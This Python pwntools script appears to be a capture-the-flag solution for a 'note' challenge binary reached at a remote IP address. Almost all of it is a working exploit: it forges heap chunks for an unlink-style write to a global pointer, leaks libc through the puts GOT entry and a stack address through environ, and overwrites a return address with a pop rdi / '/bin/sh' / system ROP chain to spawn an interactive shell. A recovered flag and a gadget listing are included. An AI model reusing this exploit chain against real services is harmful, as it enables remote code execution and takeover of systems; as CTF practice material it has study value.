from pwn import *
from ctypes import *
debug = 0
elf = ELF('./note')
#flag{t1-1_1S_0_sImPl3_n0T3}
if debug:
	p = remote('127.0.0.1', 1234)#process('./300')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	context.log_level = 'debug'
else:
	p = remote('39.107.14.183', 1234)
	libc = ELF('./libc-2.23.so')
	#off = 0x001b0000
	context.log_level = 'debug'

def change_title(title):
	p.recvuntil('-->>')
	p.sendline('1')
	p.recvuntil('title:')
	p.send(title)
def change_content(size,content):
	p.recvuntil('-->>')
	p.sendline('2')
	p.recvuntil('(64-256):')
	p.sendline(str(size))
	p.recvuntil('content:')
	p.send(content)
def change_comment(content):
	p.recvuntil('-->>')
	p.sendline('3')
	p.recvuntil('comment:')
	p.sendline(content)

def show_content():
	p.recvuntil('-->>')
	p.sendline('4')

p.recvuntil('welcome to the note ')
offset = int(p.recv(4),10)
print '[*]', str(offset + 0x10),hex(offset +0x10)

change_content(0x78,p64(0x41)*(8)+p64(0x80)*7+'\n')

change_title(p64(0x11)+p64(0x81)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)+'@')
change_content(150,'a'*110+'\n')
change_title(p64(offset+0x10-0x20)+p64(0x81)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)+'a')
change_content(0x21000,'a'*110+'\n')
change_title(p64(0x602058)+p64(elf.got['puts'])+p64(0x78)+p64(0x602058)+'\n')
show_content()
p.recvuntil('is:')
libc.address = u64(p.recv(6).ljust(8,'\0')) - libc.symbols['puts']
print '[+] system: ',hex(libc.symbols['system'])
change_comment(p64(0x602058)+p64(libc.symbols['environ'])+p64(0x78)+p64(0x602058)+'\n')
show_content()
p.recvuntil('is:')
stack_addr = u64(p.recv(6).ljust(8,'\0'))
print '[+] stack: ',hex(stack_addr)
offset =  0x7fffffffe4b8- 0x7fffffffe338 
change_comment(p64(stack_addr - offset )+p64(libc.symbols['environ'])+p64(0x78)+p64(0x602058)+'\n')

change_comment(p64(0x0000000000401673)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system']))


p.interactive()
'''
Gadgets information
============================================================
0x000000000040166c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040166e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401670 : pop r14 ; pop r15 ; ret
0x0000000000401672 : pop r15 ; ret
0x000000000040166b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040166f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400e00 : pop rbp ; ret
0x0000000000401673 : pop rdi ; ret
0x0000000000401671 : pop rsi ; pop r15 ; ret
0x000000000040166d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c71 : ret
0x00000000004002c1 : ret 0x200
0x0000000000401300 : ret 0x8948
0x00000000004012f6 : ret 0x8b48
0x0000000000400fe5 : ret 0xb60f

Unique gadgets found: 15
'''